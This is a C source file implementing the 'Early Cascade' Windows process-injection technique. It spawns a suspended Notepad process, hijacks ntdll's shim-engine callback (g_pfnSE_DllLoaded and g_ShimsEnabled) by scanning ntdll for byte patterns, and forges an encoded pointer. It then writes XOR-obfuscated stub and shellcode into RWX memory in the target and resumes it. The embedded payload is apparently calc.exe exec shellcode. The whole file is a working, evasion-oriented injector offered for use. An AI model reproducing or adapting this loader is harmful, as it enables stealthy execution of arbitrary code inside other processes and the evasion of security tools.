#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

/* Refer here. Thanks for the greate technique ->> https://github.com/0xNinjaCyclone/EarlyCascade */ 

#define DEBUG 1 // Set to 1 to enable debug output, 0 to disable

#if DEBUG 
#define printf_or_not(...) printf(__VA_ARGS__)
#else
#define printf_or_not(...)
#pragma warning(disable: 4189) // Disable unused variable warnings

#endif

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#ifdef _WIN64
#define NT_DLL_NAME L"ntdll.dll"
#else
#define NT_DLL_NAME "ntdll.dll"
#endif

#define MAX_PATTERN_SIZE 32 // Maximum size of the pattern to search for

#define CHECK_IN_RANGE(dwBasePtr, dwPtr, dwSecPtr) \
    ( \
        dwPtr >= (dwBasePtr + ((PIMAGE_SECTION_HEADER) dwSecPtr)->VirtualAddress) && \
        dwPtr <  (dwBasePtr + ((PIMAGE_SECTION_HEADER) dwSecPtr)->VirtualAddress + ((PIMAGE_SECTION_HEADER) dwSecPtr)->Misc.VirtualSize) ) 

typedef struct _CascadePattern {
    BYTE pattern[MAX_PATTERN_SIZE]; // The byte pattern to search for
    size_t size;         // Size of the address we want
    size_t offset;       // Offset from the start of the pattern to the address we want
} CascadePattern, * PCascadePattern;

LPVOID encode_system_ptr(LPVOID ptr) {
    // get pointer cookie from SharedUserData!Cookie (0x330)
    ULONG cookie = *(ULONG*)0x7FFE0330;

    // encrypt our pointer so it'll work when written to ntdll
    return (LPVOID)_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}

//BYTE x64_stub[] =
//"\x56\x57\x65\x48\x8b\x14\x25\x60\x00\x00\x00\x48\x8b\x52\x18\x48"
//"\x8d\x52\x20\x52\x48\x8b\x12\x48\x8b\x12\x48\x3b\x14\x24\x0f\x84"
//"\x85\x00\x00\x00\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x48\x83\xc1"
//"\x0a\x48\x83\xe1\xf0\x48\x29\xcc\x49\x89\xc9\x48\x31\xc9\x48\x31"
//"\xc0\x66\xad\x38\xe0\x74\x12\x3c\x61\x7d\x06\x3c\x41\x7c\x02\x04"
//"\x20\x88\x04\x0c\x48\xff\xc1\xeb\xe5\xc6\x04\x0c\x00\x48\x89\xe6"
//"\xe8\xfe\x00\x00\x00\x4c\x01\xcc\x48\xbe\xed\xb5\xd3\x22\xb5\xd2"
//"\x77\x03\x48\x39\xfe\x74\xa0\x48\xbe\x75\xee\x40\x70\x36\xe9\x37"
//"\xd5\x48\x39\xfe\x74\x91\x48\xbe\x2b\x95\x21\xa7\x74\x12\xd7\x02"
//"\x48\x39\xfe\x74\x82\xe8\x05\x00\x00\x00\xe9\xbc\x00\x00\x00\x58"
//"\x48\x89\x42\x30\xe9\x6e\xff\xff\xff\x5a\x48\xb8\x11\x11\x11\x11"
//"\x11\x11\x11\x11\xc6\x00\x00\x48\x8b\x12\x48\x8b\x12\x48\x8b\x52"
//"\x20\x48\x31\xc0\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02"
//"\x0f\x85\x83\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x01\xd0\x50"
//"\x4d\x31\xdb\x44\x8b\x58\x20\x49\x01\xd3\x48\x31\xc9\x8b\x48\x18"
//"\x51\x48\x85\xc9\x74\x69\x48\x31\xf6\x41\x8b\x33\x48\x01\xd6\xe8"
//"\x5f\x00\x00\x00\x49\x83\xc3\x04\x48\xff\xc9\x48\xbe\x38\x22\x61"
//"\xd4\x7c\xdf\x63\x99\x48\x39\xfe\x75\xd7\x58\xff\xc1\x29\xc8\x91"
//"\x58\x44\x8b\x58\x24\x49\x01\xd3\x66\x41\x8b\x0c\x4b\x44\x8b\x58"
//"\x1c\x49\x01\xd3\x41\x8b\x04\x8b\x48\x01\xd0\xeb\x43\x48\xc7\xc1"
//"\xfe\xff\xff\xff\x5a\x4d\x31\xc0\x4d\x31\xc9\x41\x51\x41\x51\x48"
//"\x83\xec\x20\xff\xd0\x48\x83\xc4\x30\x5f\x5e\x48\x31\xc0\xc3\x59"
//"\x58\xeb\xf6\xbf\x05\x15\x00\x00\x48\x31\xc0\xac\x38\xe0\x74\x0f"
//"\x49\x89\xf8\x48\xc1\xe7\x05\x4c\x01\xc7\x48\x01\xc7\xeb\xe9\xc3"
//"\xe8\xb8\xff\xff\xff";

BYTE x64_stub[] = {
"\xC4\xC5\xF7\xDA\x19\x86\xB7\xF2\x92\x92\x92\xDA\x19\xC0\x8A\xDA"
"\x1F\xC0\xB2\xC0\xDA\x19\x80\xDA\x19\x80\xDA\xA9\x86\xB6\x9D\x16"
"\x17\x92\x92\x92\xDA\x19\xE0\xC2\xDA\x9D\x25\xD8\xD8\xDA\x11\x53"
"\x98\xDA\x11\x73\x62\xDA\xBB\x5E\xDB\x1B\x5B\xDA\xA3\x5B\xDA\xA3"
"\x52\xF4\x3F\xAA\x72\xE6\x80\xAE\xF3\xEF\x94\xAE\xD3\xEE\x90\x96"
"\xB2\x1A\x96\x9E\xDA\x6D\x53\x79\x77\x54\x96\x9E\x92\xDA\x1B\x74"
"\x7A\x6C\x92\x92\x92\xDE\x93\x5E\xDA\x2C\x7F\x27\x41\xB0\x27\x40"
"\xE5\x91\xDA\xAB\x6C\xE6\x32\xDA\x2C\xE7\x7C\xD2\xE2\xA4\x7B\xA5"
"\x47\xDA\xAB\x6C\xE6\x03\xDA\x2C\xB9\x07\xB3\x35\xE6\x80\x45\x90"
"\xDA\xAB\x6C\xE6\x10\x7A\x97\x92\x92\x92\x7B\x2E\x92\x92\x92\xCA"
"\xDA\x1B\xD0\xA2\x7B\xFC\x6D\x6D\x6D\xC8\xDA\x2A\x83\x83\x83\x83"
"\x83\x83\x83\x83\x54\x92\x92\xDA\x19\x80\xDA\x19\x80\xDA\x19\xC0"
"\xB2\xDA\xA3\x52\x19\xD0\xAE\xDA\x93\x42\xF4\x13\xEA\x8A\x99\x90"
"\x9D\x17\x11\x92\x92\x92\x19\x12\x1A\x92\x92\x92\xDA\x93\x42\xC2"
"\xDF\xA3\x49\xD6\x19\xCA\xB2\xDB\x93\x41\xDA\xA3\x5B\x19\xDA\x8A"
"\xC3\xDA\x17\x5B\xE6\xFB\xDA\xA3\x64\xD3\x19\xA1\xDA\x93\x44\x7A"
"\xCD\x92\x92\x92\xDB\x11\x51\x96\xDA\x6D\x5B\xDA\x2C\xAA\xB0\xF3"
"\x46\xEE\x4D\xF1\x0B\xDA\xAB\x6C\xE7\x45\xCA\x6D\x53\xBB\x5A\x03"
"\xCA\xD6\x19\xCA\xB6\xDB\x93\x41\xF4\xD3\x19\x9E\xD9\xD6\x19\xCA"
"\x8E\xDB\x93\x41\xD3\x19\x96\x19\xDA\x93\x42\x79\xD1\xDA\x55\x53"
"\x6C\x6D\x6D\x6D\xC8\xDF\xA3\x52\xDF\xA3\x5B\xD3\xC3\xD3\xC3\xDA"
"\x11\x7E\xB2\x6D\x42\xDA\x11\x56\xA2\xCD\xCC\xDA\xA3\x52\x51\xCB"
"\xCA\x79\x64\x2D\x97\x87\x92\x92\xDA\xA3\x52\x3E\xAA\x72\xE6\x9D"
"\xDB\x1B\x6A\xDA\x53\x75\x97\xDE\x93\x55\xDA\x93\x55\x79\x7B\x51"
"\x7A\x2A\x6D\x6D\x6D" };


///* Created by msfvenom ( msfvenom -a x64 -p windows/x64/exec CMD=calc.exe -f c ) */
//BYTE x64_shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
//"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
//"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
//"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
//"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
//"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
//"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
//"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
//"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
//"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
//"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
//"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
//"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
//"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
//"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
//"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
//"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
//"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
//"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
//"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

BYTE x64_shellcode[] = {
"\x6E\xDA\x11\x76\x62\x7A\x52\x92\x92\x92\xD3\xC3\xD3\xC2\xC0\xC3"
"\xC4\xDA\xA3\x40\xF7\xDA\x19\xC0\xF2\xDA\x19\xC0\x8A\xDA\x19\xC0"
"\xB2\xDA\x19\xE0\xC2\xDA\x9D\x25\xD8\xD8\xDF\xA3\x5B\xDA\xA3\x52"
"\x3E\xAE\xF3\xEE\x90\xBE\xB2\xD3\x53\x5B\x9F\xD3\x93\x53\x70\x7F"
"\xC0\xD3\xC3\xDA\x19\xC0\xB2\x19\xD0\xAE\xDA\x93\x42\x19\x12\x1A"
"\x92\x92\x92\xDA\x17\x52\xE6\xF5\xDA\x93\x42\xC2\x19\xDA\x8A\xD6"
"\x19\xD2\xB2\xDB\x93\x42\x71\xC4\xDA\x6D\x5B\xD3\x19\xA6\x1A\xDA"
"\x93\x44\xDF\xA3\x5B\xDA\xA3\x52\x3E\xD3\x53\x5B\x9F\xD3\x93\x53"
"\xAA\x72\xE7\x63\xDE\x91\xDE\xB6\x9A\xD7\xAB\x43\xE7\x4A\xCA\xD6"
"\x19\xD2\xB6\xDB\x93\x42\xF4\xD3\x19\x9E\xDA\xD6\x19\xD2\x8E\xDB"
"\x93\x42\xD3\x19\x96\x1A\xDA\x93\x42\xD3\xCA\xD3\xCA\xCC\xCB\xC8"
"\xD3\xCA\xD3\xCB\xD3\xC8\xDA\x11\x7E\xB2\xD3\xC0\x6D\x72\xCA\xD3"
"\xCB\xC8\xDA\x19\x80\x7B\xC5\x6D\x6D\x6D\xCF\xDA\x28\x93\x92\x92"
"\x92\x92\x92\x92\x92\xDA\x1F\x1F\x93\x93\x92\x92\xD3\x28\xA3\x19"
"\xFD\x15\x6D\x47\x29\x62\x27\x30\xC4\xD3\x28\x34\x07\x2F\x0F\x6D"
"\x47\xDA\x11\x56\xBA\xAE\x94\xEE\x98\x12\x69\x72\xE7\x97\x29\xD5"
"\x81\xE0\xFD\xF8\x92\xCB\xD3\x1B\x48\x6D\x47\xF1\xF3\xFE\xF1\xBC"
"\xF7\xEA\xF7\x92"};

LPVOID find_pattern(LPBYTE pBuffer, SIZE_T dwSize, PCascadePattern pPattern) {
    if (dwSize > pPattern->size) // Avoid OOB
        while ((dwSize--) - pPattern->size) {
            if (RtlCompareMemory(pBuffer, pPattern, pPattern->size) == pPattern->size)
                return pBuffer;
            pBuffer++;
        }
	return NULL;
}

LPVOID find_pfnSE_DllLoaded(HANDLE hNtDLL, LPVOID *ppOffsetAddress) {
	printf_or_not("[*] Finding g_pfnSE_DllLoaded address...\n");
    DWORD dwNumberOfSections;
    DWORD_PTR dwPtr;
    DWORD_PTR dwTextPtr = NULL;
    DWORD_PTR dwTextEndPtr;
    DWORD_PTR dwMRDataPtr = NULL;
    DWORD_PTR dwResultPtr;
    CascadePattern aPatterns[] = {
        {
            /*

                8b14253003fe7f       mov     edx, dword ptr [7FFE0330h]
                8bc2                 mov     eax, edx
                488b3d??????00       mov     rdi, qword ptr [ntdll!g_pfnSE_DllLoaded (????????????)]
            */
            "\x8B\x14\x25\x30\x03\xFE\x7F\x8B\xC2\x48\x8B\x3D", 0x0C, 0x04
        },
        {
            // 8b14253003fe7f     mov     edx, dword [0x7ffe0330]
            // b840000000         mov     eax, 0x40
            // 488b3d??????00     mov     rdi, qword [rel g_pfnSE_DllLoaded]
            "\x8B\x14\x25\x30\x03\xFE\x7F\xB8\x40\x00\x00\x00\x48\x8B\x3D", 0x14, 0x04

        },
        {
            // 180041400  8b14253003fe7f     mov     edx, dword [0x7ffe0330]
            // 180041407  b840000000         mov     eax, 0x40
            // 18004140c  488b35cd5d1100     mov     rsi, qword [rel g_pfnSE_DllLoaded]
            "\x8B\x14\x25\x30\x03\xFE\x7F\xB8\x40\x00\x00\x00\x48\x8B\x35", 0x14, 0x04
        },

        /* Sentinel */
        { 0x00 }
    };

    /* Nt Headers */
    dwPtr = (DWORD_PTR)hNtDLL + ((PIMAGE_DOS_HEADER)hNtDLL)->e_lfanew;

    /* Get the number of ntdll sections */
    dwNumberOfSections = ((PIMAGE_NT_HEADERS)dwPtr)->FileHeader.NumberOfSections;

    /* The beginning of the section headers */
    dwPtr = (DWORD_PTR) & ((PIMAGE_NT_HEADERS)dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS)dwPtr)->FileHeader.SizeOfOptionalHeader;

	printf_or_not("        [*] Number of sections: %d\n", dwNumberOfSections);

    if (dwNumberOfSections == 0) {
        printf_or_not("        [!] No sections found in ntdll.dll.\n");
        return NULL;
	}

	// Find the .text and .mrdata sections
    while (dwNumberOfSections--) {
        if (strcmp((const char*)((PIMAGE_SECTION_HEADER)dwPtr)->Name, ".text") == 0){
            dwTextPtr = dwPtr;
			printf_or_not("        [+] Found .text section header at 0x%p\n", dwTextPtr);
        }
        if (strcmp((const char*)((PIMAGE_SECTION_HEADER)dwPtr)->Name, ".mrdata") == 0) {
            dwMRDataPtr = dwPtr;
            printf_or_not("        [+] Found .mrdata section header at 0x%p\n", dwMRDataPtr);
        }

        /* Next section header */
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }

    if (!dwTextPtr || !dwMRDataPtr) {
        printf_or_not("        [!] Failed to find .text or .mrdata section.\n");
        return NULL;
	}

    // Searching for specified patterns 
    
	for (int i = 0; aPatterns[i].pattern[0] != 0x00; i++) {
		
        CascadePattern* pPattern = &aPatterns[i];
        
        /* Points to the beginning of .text section */
        dwResultPtr = (DWORD_PTR)hNtDLL + ((PIMAGE_SECTION_HEADER)dwTextPtr)->VirtualAddress;

        /* The end of .text section */
        dwTextEndPtr = dwResultPtr + ((PIMAGE_SECTION_HEADER)dwTextPtr)->Misc.VirtualSize;

        while (dwResultPtr = (DWORD_PTR)find_pattern((LPBYTE)dwResultPtr, dwTextEndPtr - dwResultPtr, pPattern)) {

            printf_or_not("        [*] Found pattern at: %p\n", (LPVOID)dwResultPtr);
            // Calculate the address of g_pfnSE_DllLoaded

            dwResultPtr += pPattern->size;

            /* Ensure the validity of the opcode we rely on */
            if ((*(BYTE*)(dwResultPtr + 0x3)) == 0x00) {
                /* Fetch the address */
                dwPtr = (DWORD_PTR)(*(DWORD32*)dwResultPtr) + dwResultPtr + pPattern->offset;

                /* Is that address in the range we expect!? */
                if (CHECK_IN_RANGE((DWORD_PTR)hNtDLL, dwPtr, dwMRDataPtr)) {
                    /* Set the offset address */
                    if (ppOffsetAddress)
                        (*ppOffsetAddress) = (LPVOID)dwResultPtr;

                    return (LPVOID)dwPtr;
                }
            }
        }
    }
    (*ppOffsetAddress) = NULL;
    return NULL;
}

LPVOID decrypt_shellcode(BYTE pEncryptedShellcode[], SIZE_T size) {

    if (!pEncryptedShellcode) {
        printf_or_not("[!] Failed to allocate memory for decrypted shellcode.\n");
        return NULL;
    }
    for (SIZE_T i = 0; i < size; i++) {
        pEncryptedShellcode[i] = pEncryptedShellcode[i] ^ 0x92; // XOR decryption
    }
    return pEncryptedShellcode;
}

LPVOID find_ShimEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {

	printf_or_not("[*] Finding g_ShimsEnabled address...\n");

    DWORD dwNumberOfSections;
    DWORD_PTR dwPtr;
    DWORD_PTR dwResultPtr;
    DWORD_PTR dwEndPtr;
    DWORD_PTR dwDataPtr = NULL;
    CascadePattern aPatterns[] = {
        {
            /*
                c605??????0001       mov     byte ptr [ntdll!g_ShimsEnabled (????????????)], 1
            */
            "\xc6\x05",
            0x02,
            0x05
        },
        {
            /*
                443825??????00       cmp     byte ptr [ntdll!g_ShimsEnabled (????????????)], r12b
            */
            "\x44\x38\x25",
            0x03,
            0x04
        },
        {
            /*
                44383d??????00       cmp     byte ptr [ntdll!g_ShimsEnabled (????????????)], r15b
            */
            "\x44\x38\x3d",
            0x03,
            0x04
        },
        {
            /*
                40382d??????00       cmp     byte ptr [ntdll!g_ShimsEnabled (????????????)], r11b
            */
            "\x40\x38\x2d",
            0x03,
            0x04
        },
        {
            /*
                803d??????0000     cmp     byte [rel g_ShimsEnabled], 0x0
            */
            "\x80\x3D",
            0x02,
            0x05
        },
        {
            // 443835??????00     cmp     byte [rel g_ShimsEnabled], r14b
            "\x44\x38\x35",
            0x03,
            0x04
        },
        {
            // 44382d??????00     cmp     byte [rel g_ShimsEnabled], r13b
            "\x44\x38\x2d",
            0x03,
            0x04
        },
        {
            // 40883d??????00     mov     byte [rel g_ShimsEnabled], dil
            "\x40\x88\x3D",
            0x03,
            0x04
        },

        /* Sentinel */
        { 0x00 }
    };

	// finding .data section
    
    /* Nt Headers */
    dwPtr = (DWORD_PTR)hNtDLL + ((PIMAGE_DOS_HEADER)hNtDLL)->e_lfanew;

    /* Get the number of ntdll sections */
    dwNumberOfSections = ((PIMAGE_NT_HEADERS)dwPtr)->FileHeader.NumberOfSections;

    /* The beginning of the section headers */
    dwPtr = (DWORD_PTR) & ((PIMAGE_NT_HEADERS)dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS)dwPtr)->FileHeader.SizeOfOptionalHeader;

    printf_or_not("        [*] Number of sections: %d\n", dwNumberOfSections);

    if (dwNumberOfSections == 0) {
        printf_or_not("        [!] No sections found in ntdll.dll.\n");
        return NULL;
	}

    while (dwNumberOfSections--) {
        if (strcmp((const char*)((PIMAGE_SECTION_HEADER)dwPtr)->Name, ".data") == 0) {
            dwDataPtr = dwPtr;
            printf_or_not("        [+] Found .data section header at 0x%p\n", dwDataPtr);
            break;
        }
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }
    if (!dwDataPtr) {
        printf_or_not("        [!] Failed to find .data section.\n");
        return NULL;
    }

	// Searching for specified patterns
    dwResultPtr = (DWORD_PTR)hNtDLL + ((PIMAGE_SECTION_HEADER)dwDataPtr)->VirtualAddress;
    dwEndPtr = dwResultPtr + ((PIMAGE_SECTION_HEADER)dwDataPtr)->Misc.VirtualSize;
    for (CascadePattern* pPattern = aPatterns; pPattern->size; pPattern++) {
        /* Searching from the address where we found the offset of SE_DllLoadedAddress */
        dwPtr = dwEndPtr = (DWORD_PTR)pDllLoadedOffsetAddress;

        /* Also take a look in the place just before this address */
        dwPtr -= 0xFF;

        /* End of block we are searching in */
        dwEndPtr += 0xFF;

        while (dwPtr = (DWORD_PTR)find_pattern((LPBYTE)dwPtr, dwEndPtr - dwPtr, pPattern)) {
            /* Jump into the offset */
            dwPtr += pPattern->size;

            /* Ensure the validity of the opcode we rely on */
            if ((*(BYTE*)(dwPtr + 0x3)) == 0x00) {
                /* Fetch the address */
                dwResultPtr = (DWORD_PTR)(*(DWORD32*)dwPtr) + dwPtr + pPattern->offset;

                /* Is that address in the range we expect!? */
                if (CHECK_IN_RANGE((DWORD_PTR)hNtDLL, dwResultPtr, dwDataPtr))
                    return (LPVOID)dwResultPtr;
            }
        }
    }
	return NULL;

}

int main() {
    HANDLE hNtDLL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    LPVOID pBuffer;
    LPVOID pShimsEnabledAddress;
    LPVOID pSE_DllLoadedAddress;
    LPVOID pPtr;
    int nSuccess = EXIT_FAILURE;
    BOOL bEnable = TRUE;
    BOOL bIsWow64 = FALSE;

#ifdef DEBUG
    printf("[*] Encrypted x64_stub:\n");
    
	printf("\"");
        for (int i = 0; i < sizeof(x64_stub)-1; i++) {

            printf("\\x%02X", x64_stub[i]^0x92);
            if ((i + 1) % 16 == 0) {
                printf("\"\n\"");
            }
        }
	printf("\"\n\n");

	printf("[*] Encrypted x64_shellcode:\n");
    printf("\"");
        for (int i = 0; i < sizeof(x64_shellcode)-1; i++) {
            printf("\\x%02X", x64_shellcode[i]^0x92);
            if ((i + 1) % 16 == 0) {
                printf("\"\n\"");
            }
        }
		printf("\"\n\n");

#endif

    CHAR ProcessName[] = "Notepad.exe"; // Change this to the desired process name

    si.cb = sizeof(STARTUPINFOA);

    printf_or_not("[+] Starting Cascade...\n");

    if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {

        printf_or_not("[!] Failed to create process %ls.\n", ProcessName);
        return GetLastError();
    }
    else {
        printf_or_not("[+] Process created successfully.\n");

        // Check if the process is running under WOW64
        printf_or_not("[*] Checking if running under WOW64...\n");
        if (IsWow64Process(pi.hProcess, &bIsWow64)) {
            if (bIsWow64) {
                printf_or_not("[+] Running under WOW64.\n");
            }
            else {
                printf_or_not("[!] Not running under WOW64.\n");
            }
        }
        else {
            printf_or_not("[!] Failed to determine WOW64 status.\n");
            return GetLastError();
        }

    }

    printf_or_not("[*] Getting ntdll.dll handle...\n");

    hNtDLL = GetModuleHandleA("NtDLL");

    if (hNtDLL == NULL) {
        printf_or_not("[!] Failed to get ntdll.dll handle.\n");
        return GetLastError();
    }
    else {
        printf_or_not("[+] ntdll.dll handle obtained successfully.\n");
    }

    printf_or_not("[*] Finding callback pointer address... (g_pfnSE_DllLoaded)\n");

    pSE_DllLoadedAddress = find_pfnSE_DllLoaded(hNtDLL, &pPtr);

    if (pSE_DllLoadedAddress == NULL) {
        printf_or_not("[!] Failed to find g_pfnSE_DllLoaded address.\n");
        return EXIT_FAILURE;
    }
    else {
        printf_or_not("[+] g_pfnSE_DllLoaded address found at: %p\n", pSE_DllLoadedAddress);

        pShimsEnabledAddress = find_ShimEnabledAddress(hNtDLL, pPtr);

        if (pShimsEnabledAddress == NULL) {
            printf_or_not("[!] Failed to find g_ShimsEnabled address.\n");
            return EXIT_FAILURE;
        }
        else {
            printf_or_not("[+] g_ShimsEnabled address found at: %p\n", pShimsEnabledAddress);
        }

    }

    // Decrypt the shellcode and stub
	printf_or_not("[*] Decryption stuff...\n");
    decrypt_shellcode(x64_stub, sizeof(x64_stub));
    decrypt_shellcode(x64_shellcode, sizeof(x64_shellcode));


	printf_or_not("[*] Allocating memory in target process...\n");
	
    pBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(x64_stub) + sizeof(x64_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	

    if (pBuffer == NULL) {
        printf_or_not("[!] Failed to allocate memory in target process.\n");
        return GetLastError();
    }
    else {
        printf_or_not("[+] Memory allocated successfully at: %p\n", pBuffer);
	}

    /* Shellcode address */
    pPtr = (LPVOID)((DWORD_PTR)pBuffer + sizeof(x64_stub));

    /* Tell the stub where the enabling flag is located */
	CascadePattern address_pattern = { 
        "\x11\x11\x11\x11\x11\x11\x11\x11", 
        8, 
        0
    };

    RtlCopyMemory(find_pattern(x64_stub, sizeof(x64_stub), &address_pattern), &pShimsEnabledAddress, sizeof(LPVOID));

	printf_or_not("[*] Writing stub to target process...\n");
    if (!WriteProcessMemory(pi.hProcess, pBuffer, x64_stub, sizeof(x64_stub), NULL)) {
        printf_or_not("[!] Failed to write stub to target process.\n");
        return GetLastError();
    }
    else {
        printf_or_not("[+] Stub written successfully.\n");
	}
	printf_or_not("[*] Writing shellcode to target process...\n");
    if (!WriteProcessMemory(pi.hProcess, pPtr, x64_shellcode, sizeof(x64_shellcode), NULL)) {
        printf_or_not("[!] Failed to write shellcode to target process.\n");
        return GetLastError();
    }
    else {
        printf_or_not("[+] Shellcode written successfully.\n");
    }

    pPtr = encode_system_ptr((LPVOID)pBuffer);
	printf_or_not("[*] The call back has been encoded to pointer: %p\n", pPtr);

    printf_or_not("[*] Writing callback pointer to target process...\n");
    if (!WriteProcessMemory(pi.hProcess, pSE_DllLoadedAddress, &pPtr, sizeof(LPVOID), NULL)) {
        printf_or_not("[!] Failed to write callback pointer to target process.\n");
        return GetLastError();
    }
    else {
        printf_or_not("[+] Callback pointer written successfully.\n");
	}

    printf_or_not("[*] Writing g_ShimsEnabled address to target process...\n");
    if (!WriteProcessMemory(pi.hProcess, pShimsEnabledAddress, &bEnable, sizeof(BOOL), NULL)) {
        printf_or_not("[!] Failed to write g_ShimsEnabled address to target process.\n");
        return GetLastError();
    }
    else {
        printf_or_not("[+] g_ShimsEnabled address written successfully.\n");
    }
    printf_or_not("[*] Resuming target process...\n");
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf_or_not("[!] Failed to resume target process.\n");
        return GetLastError();
    }
    else {
        printf_or_not("[+] Target process resumed successfully.\n");
	}

	printf_or_not("[*] Injection complete. Waiting for process to exit...\n");

	printf_or_not("[*] Clean up\n");
    if (pi.hThread)
        CloseHandle(pi.hThread);

    if (pi.hProcess)
        CloseHandle(pi.hProcess);
	nSuccess = EXIT_SUCCESS;
    return nSuccess;
}